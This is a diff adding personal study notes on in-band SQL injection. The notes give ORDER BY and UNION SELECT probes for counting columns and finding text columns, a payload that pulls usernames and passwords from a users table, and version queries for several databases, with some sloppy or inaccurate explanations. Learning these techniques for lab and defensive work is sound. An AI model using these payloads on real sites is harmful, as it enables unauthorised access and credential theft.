@@ -1,0 +1,60 @@
+##Inband SQL injection
+
+==> Error based / Union based
+
+<===Input parameter===> dynamic parameter(URL)
+
+1) Find number of columns that are being returned by the query
+
+==>   ' order by 1-- -> Page Display without any Error
+      ' order by 2-- -> Page Display without any Error
+      ' order by 3-- -> Internal Server Error came
+
+    OR
+
+==>  ' union select null--             -> Page Display without any Error  
+     ' union select null,null--        -> Page Display without any Error 
+     ' union select null,null,null--   -> Internal Server Error came
+
+NOTE:- 3-1=2 number of columns are vulnerable in query 
+
+2) Find which columns contain text data.
+
+==> ' union select 'a',null--   -> if column 1 contain text data then response come '200'
+    ' union select null,'a'--   -> if column 2 contain text data then response come '200'
+
+NOTE:- If any of the column not contain text data then response come '500' internal server Error
+
+3) Now modify the payload using last query
+
+==> Suppose we find out that 2 column contain text data and 1 column not then query will be
+
+    ' union select null, username, password from users--
+
+    Suppose we find out that both 2 column contain text data then  query will be
+
+    ' union select  username, password from users--
+
+NOTE:- Retrive multiple values in single column using ||~|| operater    
+
+SQL CHEAT SHEET= https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+/////////////////////////////////////////////////////////////////////////////////////
+#####################################################################################
+#####################################################################################
+#####################################################################################
+/////////////////////////////////////////////////////////////////////////////////////
+
+
+##Examining the database in SQL injection attacks
+
+SQL CHEAT SHEET= https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Database type           Query
+Microsoft, MySQL    ==>	SELECT @@version
+Oracle 	            ==> SELECT * FROM v$version
+PostgreSQL 	        ==> SELECT version() 
+
+NOTE:- On oracle  we have give table name in query otherwise it will give you an error
+       There is a built-in table on Oracle called dual which you can use for        
+       this purpose. For example: UNION SELECT 'abc' FROM dual 
